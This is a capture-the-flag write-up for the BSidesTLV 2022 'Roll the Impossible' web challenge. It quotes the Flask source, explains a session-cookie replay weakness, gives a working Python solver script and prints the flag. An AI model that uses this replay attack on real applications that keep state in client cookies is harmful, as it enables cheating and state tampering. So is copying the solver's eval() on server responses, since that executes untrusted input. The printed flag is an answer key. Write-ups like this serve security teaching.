## Web: Roll the Impossible (300)

### Description/Source

```python
#flask-server.py
import os
import challenge
from flask import Flask, session, render_template

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", os.urandom(32))

@app.route("/")
def init():
    challenge.init()
    return render_template("index.html")

@app.route("/step", methods=["POST"])
def step():
    return challenge.step()
```

```python
#challenge.py
from flask import session
import flag
import random

CTX_FIELDS = ["question", "num"]
NUM_DIGITS = 10
FISH_IN_SEA = 3500000000000 # thanks wikipedia

QUESTIONS_LIST = {"roll a negative number": lambda num: int(num) < 0,
        "roll a number that is divisable by 10": lambda num: int(num) % 10 == 0,
        "roll a number that contains only ones": lambda num: all(x == "1" for x in num),
        "roll the number of fish in the sea": lambda num: int(num) == random.randrange(FISH_IN_SEA),
        "misdirection": lambda num: True}

def is_context_exist():
    return all(key in session for key in CTX_FIELDS)

def init():
    question = random.choice(list(QUESTIONS_LIST.keys())[:-1])

    # init context, must contain all the fields in CTX_FIELDS
    session["question"] = question
    session["num"] = ""

def step():
    if not is_context_exist():
        return {"num": "", "new_digit": "", "flag": "invalid session data"}
    # load data from the session
    question = session["question"]
    num = session["num"]

    _flag = ""
    new_digit = ""
    if len(num) < NUM_DIGITS:
        # roll a new digit and update the number
        new_digit = str(random.randrange(9)+1)
        num += new_digit
    if len(num) == NUM_DIGITS:
        if QUESTIONS_LIST[question](num):
            _flag = flag.FLAG
        else:
            _flag = "wrong :("

    # store the changed data to the session
    session["num"] = num
    return {"num": num,
            "new_digit": new_digit,
            "flag": _flag}
```

We have to get one of the questions in `QUESTIONS_LIST` to evaluate to true. Everything is impossible except for rolling a number that consists of 10 consecutive ones.

Your current number and question is determined and protected by a flask session cookie, which can't be cracked. (There was a misdirection with a fake session key in the docker file lol)

The way to solve is to note that each digit is rolled one at a time. So we can keep using the existing cookie that has our existing number, and keep rolling until it returns a `1`.

### Solver

```python
from base64 import b64decode
import requests

url = "https://roll-the-impossible.ctf.bsidestlv.com/"


def extractCookie(response):
    return response.headers['Set-Cookie'].split(';')[0].split('=')[1]


def getBaseCookie():
    r = requests.get(url)
    actual_cookie = extractCookie(r)
    first_cookie = b64decode(actual_cookie + '==')
    if b'only ones' in first_cookie:
        return actual_cookie
    else:
        return False

base = getBaseCookie()
while not base:
    base = getBaseCookie()

print("Got base cookie:", base)

def getOne(base_cookie):
    success = False
    while not success:
        r = requests.post(url + '/step', cookies={'session': base_cookie})
        if eval(r.text)['new_digit'] == '1':
            print(r.text)
            return extractCookie(r)

for i in range(10):
    base = getOne(base)

```

### Flag

```
BSidesTLV2022{r0ll_back_th3_1mp0ssib111111111111e}
```
